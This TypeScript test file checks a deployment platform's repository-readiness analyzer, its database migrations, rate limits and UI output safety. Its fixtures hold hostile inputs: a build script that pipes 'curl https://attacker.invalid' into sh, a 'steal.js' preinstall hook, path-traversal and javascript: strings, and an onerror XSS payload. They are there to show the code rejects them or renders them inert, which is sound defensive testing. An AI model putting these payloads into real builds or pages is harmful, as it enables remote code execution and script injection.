import assert from 'node:assert/strict';
import { readdirSync, readFileSync } from 'node:fs';
import { DatabaseSync } from 'node:sqlite';
import test from 'node:test';

import { analyzeNodeRepository } from '../lib/app-runtime.ts';
import { RATE_LIMIT_RULES } from '../lib/rate-limit.ts';
import { ZERO_COST_RESOURCES } from '../lib/zero-mode.ts';
import { EVIDENCE_ACTIONS } from '../lib/audit-actions.ts';
import {
  READINESS_LIMITS,
  buildReadinessPreview,
  buildReadinessReport,
  classifyBlocker,
  parseReadinessReport,
  readinessSummary,
  repositoryUrl,
  serializeReadinessReport,
  type ReadinessReport,
} from '../lib/readiness.ts';
import { splitStatements, stripSqlComments } from '../lib/sql-guard.ts';

function source(path: string): string {
  return readFileSync(new URL(`../${path}`, import.meta.url), 'utf8');
}

function migration(name: string): string {
  return source(`db/migrations/${name}`);
}

function apply(database: DatabaseSync, name: string): void {
  const sql = migration(name);
  for (const statement of splitStatements(stripSqlComments(sql))) database.exec(statement);
}

const MIGRATIONS = readdirSync(new URL('../db/migrations', import.meta.url))
  .filter((file) => file.endsWith('.sql'))
  .sort();

// ==========================================================================
// Pure module: report building, classification, bounding.
// ==========================================================================

const safeLockfile = JSON.stringify({ name: 'safe-api', lockfileVersion: 3, packages: {} });

/** The exact fixture shape `tests/smart-deploy.test.ts` uses for the real analyzer. */
function analyze(overrides: Partial<Parameters<typeof analyzeNodeRepository>[0]> = {}) {
  return analyzeNodeRepository({
    packageJson: JSON.stringify({
      name: 'safe-api',
      engines: { node: '>=25 <27' },
      scripts: { start: 'node src/server.js', test: 'node --test' },
      dependencies: { express: '5.1.0' },
    }),
    files: ['package.json', 'package-lock.json', 'src/server.js', '.env.example'],
    nvmrc: null,
    envExample: 'DATABASE_URL=write-only\nAPI_TOKEN=never-returned\nPORT=ignored',
    lockfileContent: safeLockfile,
    ...overrides,
  });
}

void test('a compliant repository produces a ready verdict with a truthful, unexecuted preview', () => {
  const report = buildReadinessReport({
    analysis: analyze(),
    commit: 'a'.repeat(40),
    branch: 'main',
  });
  assert.equal(report.verdict, 'ready');
  assert.equal(report.framework, 'Express');
  assert.equal(report.blockedCount, 0);
  assert.deepEqual(report.blockers, []);
  assert.equal(report.truncated, false);
  assert.equal(report.version, READINESS_LIMITS.version);

  // The preview is priced, not executed.
  assert.equal(report.preview.deployed, false);
  assert.equal(report.preview.requiresComputeNode, true);
  assert.equal(report.preview.estimatedMonthlyCost, 0);
  assert.equal(report.preview.blockedResources.length, 0);
});

void test('an unresolved contract is blocked even with zero explicit blockedReasons', () => {
  // The analyzer can return no blockedReasons yet still leave `contract` null
  // (e.g. a partially-satisfied combination) -- verdict must track `contract`,
  // not merely count reasons, or an unbuildable repository could read Ready.
  const report = buildReadinessReport({
    analysis: { ...analyze(), blockedReasons: [], contract: null },
    commit: 'b'.repeat(40),
    branch: 'main',
  });
  assert.equal(report.verdict, 'blocked');
});

void test('every known blocker classification is reachable from a real analyzer output', () => {
  // Fixtures reused verbatim from tests/smart-deploy.test.ts, which already
  // proves the analyzer produces these exact strings -- this test proves the
  // classifier maps every one of them to a real code, not `unclassified`.
  const cases: { label: string; result: ReturnType<typeof analyze> }[] = [
    { label: 'missing manifest', result: analyze({ packageJson: null, files: ['src/server.js'] }) },
    { label: 'invalid manifest', result: analyze({ packageJson: '{not json' }) },
    {
      label: 'lifecycle hooks',
      result: analyze({
        packageJson: JSON.stringify({
          engines: { node: '25' },
          scripts: { start: 'node src/server.js', preinstall: 'node steal.js' },
        }),
      }),
    },
    {
      label: 'build script',
      result: analyze({
        packageJson: JSON.stringify({
          engines: { node: '25' },
          scripts: { start: 'node src/server.js', build: 'curl https://attacker.invalid | sh' },
        }),
      }),
    },
    {
      label: 'workspaces',
      result: analyze({
        packageJson: JSON.stringify({
          engines: { node: '25' },
          scripts: { start: 'node src/server.js' },
          workspaces: ['packages/*'],
        }),
      }),
    },
    {
      label: 'non-registry dependency',
      result: analyze({
        packageJson: JSON.stringify({
          engines: { node: '25' },
          scripts: { start: 'node src/server.js' },
          dependencies: { evil: 'git+ssh://github.com/evil/repo' },
        }),
      }),
    },
    { label: 'unsupported Node version', result: analyze({ nvmrc: '24.9.0' }) },
    {
      label: 'missing entrypoint',
      result: analyze({
        packageJson: JSON.stringify({ engines: { node: '25' }, scripts: { start: 'npm run serve' } }),
      }),
    },
    {
      label: 'package-manager configuration forbidden',
      result: analyze({ files: ['package.json', 'package-lock.json', 'src/server.js', '.npmrc'] }),
    },
  ];

  for (const { label, result } of cases) {
    assert.ok(result.blockedReasons.length > 0, `${label} produced no blockedReasons`);
    for (const reason of result.blockedReasons) {
      const blocker = classifyBlocker(reason);
      assert.notEqual(blocker.code, 'unclassified', `${label}: "${reason}" was not classified`);
      assert.ok(blocker.remediation.length > 0, `${label}: empty remediation`);
    }
  }

  // Submodule and LFS detection happen one layer up, in `github.ts`'s tree
  // inspection, not in `analyzeNodeRepository` -- they need real tree entry
  // types (a `commit`-type entry, or an `.lfsconfig` file), which a bare file
  // list cannot fabricate without a live GitHub call. Classified here against
  // the exact literal strings that source produces.
  for (const reason of ['Git submodules are not allowed.', 'Git LFS objects are not allowed.']) {
    const blocker = classifyBlocker(reason);
    assert.notEqual(blocker.code, 'unclassified', reason);
  }
});

void test('an unrecognized reason is kept, not dropped, and gets a generic remediation', () => {
  // Losing a blocker would make a blocked repository read as ready -- the one
  // mistake this must never make, so novel prose is preserved verbatim.
  const blocker = classifyBlocker('A brand new constraint nobody has written a rule for yet.');
  assert.equal(blocker.code, 'unclassified');
  assert.equal(blocker.title, 'A brand new constraint nobody has written a rule for yet.');
  assert.ok(blocker.remediation.length > 0);
});

void test('blocker text is stripped of control characters and length-capped, never silently emptied', () => {
  const withControlChars = 'bad' + String.fromCharCode(0) + 'name' + String.fromCharCode(127) + 'here';
  const blocker = classifyBlocker(withControlChars);
  assert.equal(blocker.title, 'bad name here');

  const long = 'x'.repeat(500);
  const longBlocker = classifyBlocker(long);
  assert.ok(longBlocker.title.length <= READINESS_LIMITS.titleChars);
  assert.ok(longBlocker.title.endsWith('…'));
});

void test('serialization stays within the storage cap regardless of blocker volume', () => {
  const manyBlockers = Array.from({ length: 200 }, (_, index) => `Blocker number ${index} with some explanatory text.`);
  const report = buildReadinessReport({
    analysis: { ...analyze(), blockedReasons: manyBlockers, contract: null },
    commit: 'c'.repeat(40),
    branch: 'main',
  });
  const { json, storedBlockers } = serializeReadinessReport(report);
  assert.ok(new TextEncoder().encode(json).length <= READINESS_LIMITS.reportBytes);

  const parsed = JSON.parse(json) as ReadinessReport;
  // The verdict and the true count survive the cut, even though the list does not.
  assert.equal(parsed.verdict, 'blocked');
  assert.equal(parsed.blockedCount, 200);
  assert.equal(parsed.truncated, true);
  assert.equal(parsed.blockers.length, storedBlockers);
  assert.ok(storedBlockers < 200);
});

void test('a report that fits under the cap is not truncated', () => {
  const report = buildReadinessReport({
    analysis: { ...analyze(), blockedReasons: ['One thing to fix.'], contract: null },
    commit: 'd'.repeat(40),
    branch: 'main',
  });
  const { json } = serializeReadinessReport(report);
  const parsed = JSON.parse(json) as ReadinessReport;
  assert.equal(parsed.truncated, false);
  assert.equal(parsed.blockers.length, 1);
});

void test('parseReadinessReport is defensive: malformed, oversized, or wrong-shaped input is null, never thrown', () => {
  assert.equal(parseReadinessReport(null), null);
  assert.equal(parseReadinessReport(''), null);
  assert.equal(parseReadinessReport('{not json'), null);
  assert.equal(parseReadinessReport('null'), null);
  assert.equal(parseReadinessReport('"just a string"'), null);
  assert.equal(parseReadinessReport('[]'), null);
  assert.equal(parseReadinessReport(JSON.stringify({ version: 999, verdict: 'ready', commit: 'x', blockers: [] })), null);
  assert.equal(parseReadinessReport(JSON.stringify({ version: 1, verdict: 'maybe', commit: 'x', blockers: [] })), null);
  assert.equal(parseReadinessReport(JSON.stringify({ version: 1, verdict: 'ready', commit: 'x' })), null);
  assert.equal(parseReadinessReport('x'.repeat(READINESS_LIMITS.reportBytes * 3)), null);
});

void test('parseReadinessReport round-trips a real serialized report exactly', () => {
  const report = buildReadinessReport({ analysis: analyze(), commit: 'e'.repeat(40), branch: 'main' });
  const { json } = serializeReadinessReport(report);
  const parsed = parseReadinessReport(json);
  assert.deepEqual(parsed, JSON.parse(json));
  assert.equal(parsed?.verdict, 'ready');
});

void test('the Zero Mode preview matches the same free-tier resources Smart Deploy itself plans', () => {
  const preview = buildReadinessPreview(true);
  assert.equal(preview.estimatedMonthlyCost, 0);
  assert.equal(preview.blockedResources.length, 0);
  assert.equal(preview.deployed, false);
  assert.equal(preview.requiresComputeNode, true);

  const names = preview.resources.map((resource) => resource.name).sort();
  assert.deepEqual(
    names,
    [
      ZERO_COST_RESOURCES.cloudflareWorker.name,
      ZERO_COST_RESOURCES.cloudflareD1.name,
      ZERO_COST_RESOURCES.userOwnedAppCompute.name,
    ].sort(),
  );

  // Disabling Zero Mode must not make the preview lie about cost -- every
  // listed resource is free regardless of the flag.
  const disabled = buildReadinessPreview(false);
  assert.equal(disabled.estimatedMonthlyCost, 0);
});

void test('readinessSummary reads never/ready/blocked purely from the denormalised columns', () => {
  assert.deepEqual(readinessSummary({}), {
    state: 'never',
    analyzedAt: null,
    commit: null,
    shortCommit: null,
    framework: null,
    blockedCount: null,
    branch: null,
  });

  const ready = readinessSummary({
    readinessAnalyzedAt: 1000,
    readinessCommit: 'f'.repeat(40),
    readinessFramework: 'Express',
    readinessBlockedCount: 0,
    readinessSourceBranch: 'main',
  });
  assert.equal(ready.state, 'ready');
  assert.equal(ready.shortCommit, 'f'.repeat(7));

  const blocked = readinessSummary({
    readinessAnalyzedAt: 1000,
    readinessCommit: 'a'.repeat(40),
    readinessBlockedCount: 3,
  });
  assert.equal(blocked.state, 'blocked');
  assert.equal(blocked.blockedCount, 3);
});

void test('repositoryUrl only ever returns a canonical github.com link built from validated parts', () => {
  assert.equal(repositoryUrl('octocat', 'hello-world'), 'https://github.com/octocat/hello-world');
  assert.equal(repositoryUrl('OpenYsd', 'ysd-zero-cloud'), 'https://github.com/OpenYsd/ysd-zero-cloud');

  for (const [owner, repo] of [
    ['octo cat', 'repo'],
    ['octocat', 'repo name'],
    ['.', 'repo'],
    ['octocat', '..'],
    ['javascript:alert(1)', 'repo'],
    ['octocat', 'repo?x=1'],
    ['octocat', 'repo/../../etc'],
    ['x'.repeat(200), 'repo'],
    ['', 'repo'],
    ['octocat', ''],
  ] as const) {
    assert.equal(repositoryUrl(owner, repo), null, `${owner}/${repo} must be rejected`);
  }
});

// ==========================================================================
// Migration 0018: structural safety.
// ==========================================================================

void test('migration 0018 is additive only: six nullable columns on project, nothing else', () => {
  const sql = migration('0018_project_readiness.sql');
  const statements = splitStatements(stripSqlComments(sql));
  assert.equal(statements.length, 6);
  for (const statement of statements) {
    assert.match(statement, /^ALTER TABLE project ADD COLUMN readiness[A-Za-z]+ (INTEGER|TEXT)$/);
  }
  assert.doesNotMatch(sql, /DROP |DELETE FROM|UPDATE project SET|CREATE TABLE|CREATE INDEX|CREATE TRIGGER/i);
  assert.doesNotMatch(sql, /NOT NULL/);
  // The legacy orphan `projects` (plural) table must never be touched here.
  assert.doesNotMatch(sql, /ALTER TABLE projects\b/);
});

/** Everything through 0017, so the 0018 upgrade can be exercised on real data. */
function databaseAt0017(): DatabaseSync {
  const database = new DatabaseSync(':memory:');
  database.exec('PRAGMA foreign_keys = ON');
  for (const name of MIGRATIONS.filter((file) => file < '0018_project_readiness.sql')) {
    apply(database, name);
  }
  database.exec(`
    INSERT INTO "user" (id,name,email,emailVerified,image,createdAt,updatedAt) VALUES
      ('user_one','One','one@test.invalid',1,NULL,1,1),
      ('user_two','Two','two@test.invalid',1,NULL,1,1);
    INSERT INTO organization (id,name,slug,ownerUserId,status,adminCanRevokeSessions,createdAt,updatedAt) VALUES
      ('org_one','One','one','user_one','active',1,1,1),
      ('org_two','Two','two','user_two','active',1,1,1);
    INSERT INTO workspace (id,organizationId,name,ownerUserId,zeroMode,autoScan,sleepIdleServers,previewDeployments,createdAt,updatedAt) VALUES
      ('ws_one','org_one','One','user_one',1,1,1,0,1,1),
      ('ws_two','org_two','Two','user_two',1,1,1,0,1,1);
    INSERT INTO project (id,workspaceId,name,repository,framework,environment,region,status,visibility,createdAt,updatedAt) VALUES
      ('project_one','ws_one','One','OpenYsd/one','Node.js','Production','Local','idle','private',5,5),
      ('project_two','ws_two','Two','OpenYsd/two','Node.js','Production','Local','idle','private',5,5);
  `);
  return database;
}

function columns(database: DatabaseSync, table: string): string[] {
  return database
    .prepare('SELECT name FROM pragma_table_info(?)')
    .all(table)
    .map((row) => (row as { name: string }).name);
}

void test('a fresh database applies cleanly through 0018 and carries all six readiness columns', () => {
  const database = new DatabaseSync(':memory:');
  try {
    database.exec('PRAGMA foreign_keys = ON');
    for (const name of MIGRATIONS) apply(database, name);
    const cols = columns(database, 'project');
    for (const expected of [
      'readinessAnalyzedAt', 'readinessCommit', 'readinessFramework',
      'readinessBlockedCount', 'readinessReport', 'readinessSourceBranch',
    ]) {
      assert.ok(cols.includes(expected), `missing column ${expected}`);
    }
  } finally {
    database.close();
  }
});

void test('upgrading a 0017 database to 0018 preserves every existing project row and leaves readiness NULL', () => {
  const database = databaseAt0017();
  const projectColumns =
    'id, workspaceId, name, repository, framework, environment, region, status, visibility, createdAt, updatedAt';
  try {
    const before = database.prepare(`SELECT ${projectColumns} FROM project ORDER BY id`).all();
    apply(database, '0018_project_readiness.sql');
    const after = database.prepare(`SELECT ${projectColumns} FROM project ORDER BY id`).all();
    assert.deepEqual(after, before);

    const readiness = database
      .prepare('SELECT readinessAnalyzedAt, readinessCommit, readinessReport FROM project WHERE id = ?')
      .get('project_one') as { readinessAnalyzedAt: unknown; readinessCommit: unknown; readinessReport: unknown };
    assert.equal(readiness.readinessAnalyzedAt, null);
    assert.equal(readiness.readinessCommit, null);
    assert.equal(readiness.readinessReport, null);
  } finally {
    database.close();
  }
});

void test('applying 0018 to an already-migrated database is refused by the ledger-backed runner, not silently repeated', () => {
  // Wrangler's `d1_migrations` ledger provides exactly-once semantics; this
  // proves the raw statements themselves are not naturally idempotent (a
  // second ALTER TABLE ADD COLUMN must fail), which is exactly why the
  // ledger -- not the SQL -- is what guarantees single application.
  const database = databaseAt0017();
  try {
    apply(database, '0018_project_readiness.sql');
    assert.throws(() => apply(database, '0018_project_readiness.sql'), /duplicate column name/i);
  } finally {
    database.close();
  }
});

void test('readiness columns stay workspace-scoped: writing one project never touches another workspace', () => {
  const database = databaseAt0017();
  try {
    apply(database, '0018_project_readiness.sql');
    database
      .prepare(
        `UPDATE project SET readinessAnalyzedAt = ?, readinessCommit = ?, readinessBlockedCount = ?
           WHERE workspaceId = ? AND id = ?`,
      )
      .run(1000, 'a'.repeat(40), 0, 'ws_one', 'project_one');

    const untouched = database
      .prepare('SELECT readinessAnalyzedAt FROM project WHERE id = ?')
      .get('project_two') as { readinessAnalyzedAt: unknown };
    assert.equal(untouched.readinessAnalyzedAt, null);

    // The same id under the wrong workspace must affect nothing -- this is
    // the exact predicate `lib/server/projects.ts` uses.
    database
      .prepare('UPDATE project SET readinessBlockedCount = 9 WHERE workspaceId = ? AND id = ?')
      .run('ws_two', 'project_one');
    const stillZero = database
      .prepare('SELECT readinessBlockedCount FROM project WHERE id = ?')
      .get('project_one') as { readinessBlockedCount: unknown };
    assert.equal(stillZero.readinessBlockedCount, 0);
  } finally {
    database.close();
  }
});

void test('the lazy migration runner registers every migration file on disk, in order', () => {
  // This is the exact gap that let 0018 exist on disk without ever running
  // through the app's own lazy runner: `db.ts` builds its own hard-coded
  // list, so a new file has to be added there by hand. Structural, so a
  // future Phase 15 migration cannot go missing the same way.
  const runner = source('lib/server/db.ts');
  const names = MIGRATIONS.map((file) => file.replace(/\.sql$/, ''));
  const registeredOrder = [...runner.matchAll(/\{ name: '([a-z0-9_]+)', sql:/g)].map((match) => match[1]);
  assert.deepEqual(registeredOrder, names);
  for (const name of names) {
    assert.match(runner, new RegExp(`'\\.\\./\\.\\./db/migrations/${name}\\.sql\\?raw'`));
  }
});

// ==========================================================================
// Rate limit, evidence catalog wiring, and route-level structural safety.
// ==========================================================================

void test('repository analysis has its own conservative, pre-flight rate limit', () => {
  const rule = RATE_LIMIT_RULES['deploy:analyze'];
  assert.ok(rule, 'deploy:analyze must be a registered rate-limit bucket');
  // Loose enough for someone fixing one blocker at a time, tight enough that
  // no single account can exhaust GitHub's shared unauthenticated 60/hour
  // budget (3-8 GitHub calls per analysis) on its own.
  assert.ok(rule.limit <= 20);
  assert.equal(rule.windowMs, 60 * 60_000);
});

void test('the analyze route checks the rate limit before doing any repository work', () => {
  const route = source('app/api/projects/[id]/analyze/route.ts');
  const rateLimitAt = route.indexOf("enforceRateLimit('deploy:analyze'");
  const workAt = route.indexOf('analyzeProjectReadiness(');
  assert.ok(rateLimitAt >= 0 && workAt >= 0);
  assert.ok(rateLimitAt < workAt, 'rate limit must be enforced before outbound GitHub work can start');
});

void test('a rejected rate limit response is returned before the route can reach the analyzer', () => {
  const route = source('app/api/projects/[id]/analyze/route.ts');
  assert.match(route, /if \(limited\.response\) return limited\.response;/);
});

void test('an unknown project id returns a plain 404 with no audit evidence, before any other project logic runs', () => {
  const route = source('app/api/projects/[id]/analyze/route.ts');
  // Discriminated by `projectNotFound`, not by status code: GitHub's own
  // inspection can independently fail with a 404-shaped error (renamed or
  // rate-limited repository), and that case must still be recorded as
  // evidence, since the project genuinely exists and belongs to this tenant.
  const notFoundAt = route.indexOf('result.projectNotFound');
  const recordAt = route.indexOf('recordEvidence(');
  assert.ok(notFoundAt >= 0 && recordAt >= 0);
  assert.ok(notFoundAt < recordAt);
  // The projectNotFound branch returns before evidence is written, and
  // identifies no foreign project or repository in the response.
  const branch = route.slice(notFoundAt, route.indexOf('return Response.json', notFoundAt + 20) + 200);
  assert.doesNotMatch(branch, /repository|owner/i);

  const projects = source('lib/server/projects.ts');
  // Exactly one branch sets the discriminant: the tenant-scoped lookup
  // itself. A GitHub-side failure must never be able to set it.
  assert.equal((projects.match(/projectNotFound: true/g) ?? []).length, 1);
});

void test('the success evidence carries exactly the metadata keys the catalog allows, no manifest or credential content', () => {
  const route = source('app/api/projects/[id]/analyze/route.ts');
  const analyzeAction = EVIDENCE_ACTIONS.find((entry) => entry.action === 'project.readiness.analyze')!;
  for (const key of analyzeAction.metadataKeys) {
    assert.match(route, new RegExp(`\\b${key}:`), `route must set metadata.${key}`);
  }
  assert.doesNotMatch(route, /packageJson|dependencies|GITHUB_TOKEN|authorization/i);
});

void test('the route accepts no request fields: the analyzed repository always comes from the stored project', () => {
  const route = source('app/api/projects/[id]/analyze/route.ts');
  assert.match(route, /readBoundedJson\(request, 512\)/);
  assert.match(route, /Object\.keys\(parsed\.body\)\.length > 0/);
  assert.doesNotMatch(route, /body\.repository|parsed\.body\.repository/);
});

// ==========================================================================
// Bounded, non-N+1 project reads.
// ==========================================================================

void test('the project list query selects the six readiness summary columns and never the stored report', () => {
  const projects = source('lib/server/projects.ts');

  // `listProjects`, `getProject`, and `findProjectByName` all interpolate the
  // one shared `PROJECT_COLUMNS` constant rather than spelling the column
  // list out per function, so proving the constant is correct proves all
  // three at once.
  const columnsStart = projects.indexOf('const PROJECT_COLUMNS = ');
  const columnsEnd = projects.indexOf(';', columnsStart);
  const columns = projects.slice(columnsStart, columnsEnd);

  assert.match(columns, /readinessAnalyzedAt/);
  assert.match(columns, /readinessCommit/);
  assert.match(columns, /readinessFramework/);
  assert.match(columns, /readinessBlockedCount/);
  assert.match(columns, /readinessSourceBranch/);
  // The large field is deliberately absent from the shared summary columns.
  assert.doesNotMatch(columns, /readinessReport/);

  const listFnStart = projects.indexOf('export async function listProjects(');
  const listFnEnd = projects.indexOf('\nexport ', listFnStart + 10);
  const listBody = projects.slice(listFnStart, listFnEnd);
  assert.match(listBody, /\$\{PROJECT_COLUMNS\}/);
  // Exactly one statement -- no per-row follow-up query.
  assert.equal((listBody.match(/\bquery</g) ?? []).length, 1);
  assert.doesNotMatch(listBody, /for \(const .* of .*\) \{[\s\S]*await/);
});

void test('a single readiness analysis costs a bounded, small number of D1 statements', () => {
  const projects = source('lib/server/projects.ts');
  const fnStart = projects.indexOf('export async function analyzeProjectReadiness(');
  const fnEnd = projects.indexOf('\nexport ', fnStart + 10);
  const body = projects.slice(fnStart, fnEnd);

  // One tenant-scoped read (getProject, itself one statement), one bounded
  // GitHub inspection, one UPDATE, one telemetry write. No loop over rows.
  assert.equal((body.match(/await getProject\(/g) ?? []).length, 1);
  assert.equal((body.match(/await execute\(/g) ?? []).length, 1);
  assert.doesNotMatch(body, /for \(const .* of .*\) \{[\s\S]*await/);
});

// ==========================================================================
// Output safety: every string reaching the readiness UI came from a
// stranger's repository and is treated as hostile.
// ==========================================================================

void test('the readiness UI never injects raw HTML and never echoes an unvalidated href', () => {
  for (const file of ['components/projects-view.tsx', 'components/smart-deploy-panel.tsx']) {
    const text = source(file);
    assert.doesNotMatch(text, /dangerouslySetInnerHTML/, `${file} must render text only`);
  }

  const view = source('components/projects-view.tsx');
  // The one place a repository-derived href reaches the DOM goes through
  // `safeRepositoryLink`, which rebuilds the URL from validated owner/repo
  // parts -- never `project.repository` interpolated directly into an href.
  assert.match(view, /href=\{link\}/);
  assert.doesNotMatch(view, /href=\{project\.repository\}/);
  assert.doesNotMatch(view, /href=\{`[^`]*\$\{project\.repository\}/);

  // The Smart Deploy hand-off link is built from `encodeURIComponent` over
  // already-server-validated fields (Project['repository'] came back from a
  // stored, workspace-scoped row), never a raw query-string concatenation of
  // unencoded text.
  assert.match(view, /encodeURIComponent\(project\.repository\)/);
});

void test('a hostile blocker title cannot smuggle markup past React text rendering', () => {
  // classifyBlocker performs no HTML-awareness of its own -- React's default
  // text-child rendering is the actual defense. This proves the pure layer at
  // least does not help an attacker: the tag survives as inert text, is
  // control-character-stripped, and is length-capped like any other title.
  const hostile = classifyBlocker('<img src=x onerror=alert(1)>' + 'A'.repeat(300));
  assert.ok(hostile.title.includes('<img'));
  assert.ok(hostile.title.length <= READINESS_LIMITS.titleChars);
});

void test('the deploy hand-off link is only ever rendered for a ready verdict, never while blocked', () => {
  const view = source('components/projects-view.tsx');
  const linkStart = view.indexOf("Select Compute Node to deploy");
  const guardWindow = view.slice(Math.max(0, linkStart - 700), linkStart);
  assert.match(guardWindow, /report\.verdict === 'ready'/);
});
